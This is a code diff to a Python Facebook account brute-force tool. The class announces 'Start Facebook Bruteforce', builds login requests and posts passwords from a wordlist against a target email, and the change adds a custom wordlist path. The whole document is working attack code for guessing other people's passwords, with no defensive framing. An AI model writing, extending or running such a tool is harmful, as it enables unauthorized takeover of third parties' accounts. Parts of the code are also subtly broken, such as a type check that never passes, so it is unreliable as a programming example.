@@ -24,7 +24,7 @@ class Facebook:
         'password': ''
     }
     # init
-    def __init__(self, Email, TypeExecute, Password = ''):
+    def __init__(self, Email, TypeExecute, customfile, Password = ''):
         if type(Email) == 'str':
             if '@gmail.com' in Email or '@yahoo.com' in Email or '@' in Email and '.' in Email:
                 if TypeExecute == 'manual':
@@ -33,6 +33,7 @@ class Facebook:
         self.typeExec = TypeExecute
         self.account['email'] = Email
         self.account['password'] = Password
+        self.customfile = customfile
         print(logtime(), colored('Start Facebook Bruteforce', 'blue'))
         dot = 0
         onwhile = True
@@ -43,6 +44,7 @@ class Facebook:
             if(dot == 100): onwhile = False
         print('')
         self.run()
+
     def CreateForm(self):
         form = dict()
         self.cookies = {
@@ -61,6 +63,7 @@ class Facebook:
         # 404/500/403
         else:
             sys.exit()
+
     def run(self):
         self.CreateForm()
         def postdata(email, password):
@@ -91,15 +94,33 @@ class Facebook:
                 return False
         # using txt file
         if(self.typeExec == 'auto'):
-            file = open('passwords.txt', 'r')
-            fileb = open('passwords.txt', 'rb')
-            sumfile = len(list(fileb))
-            i = 0
-            for data in file:
-                i += 1
-                print(logtime(), "({i}/{sumfile})".format(i = str(i), sumfile=sumfile), end="-> ")
-                postdata(self.account['email'], data)
-                time.sleep(0.1)
+            file = ''
+            fileb = ''
+            def success():
+                sumfile = len(list(fileb))
+                i = 0
+                for data in file:
+                    i += 1
+                    print(logtime(), "({i}/{sumfile})".format(i = str(i), sumfile=sumfile), end="-> ")
+                    postdata(self.account['email'], data)
+
+            if self.customfile:
+                try:
+                    file = open(self.customfile, 'r')
+                    fileb = open(self.customfile, 'rb')
+                except:
+                    print(logtime(), colored(f"{self.customfile} not founds. Create wordlist now", 'red'))
+                finally:
+                    success()
+
+            else:
+                try:
+                    file = open('passwords.txt', 'r')
+                    fileb = open('passwords.txt', 'rb')
+                except:
+                    print(logtime(), colored("passwords.txt not founds. Create wordlist now", 'red'))
+                finally:
+                    success()
         # using password
         if(self.typeExec == 'manual'):
             email = self.account['email']
